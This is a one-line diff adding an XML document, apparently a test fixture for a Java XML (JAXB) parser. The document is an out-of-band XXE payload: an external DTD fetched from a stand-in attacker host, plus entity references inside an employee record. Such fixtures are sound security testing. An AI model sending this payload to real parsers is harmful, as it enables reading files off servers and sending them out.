@@ -1,0 +1,1 @@
+<!DOCTYPE root [ <!ENTITY % send SYSTEM "http://attackerserver-jaxb:8888/malformurl.dtd" > %send; %ent;  ]><employee id="1"><name>Amy &data;</name><salary>6000.0</salary></employee>
